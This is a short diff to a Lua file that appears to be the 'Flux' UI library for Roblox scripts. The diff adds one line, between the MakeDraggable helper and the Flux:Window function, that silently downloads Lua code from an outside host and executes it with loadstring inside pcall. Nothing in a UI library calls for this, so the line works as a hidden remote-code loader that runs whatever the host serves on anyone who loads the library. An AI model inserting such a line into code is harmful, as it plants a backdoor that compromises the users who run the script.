@@ -90,7 +90,7 @@ local function MakeDraggable(topbarobject, object)
 	)
 end
 
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/drag.lua", true))() end)
 
 function Flux:Window(text, bottom,mainclr,toclose)
 	CloseBind = toclose or Enum.KeyCode.RightControl
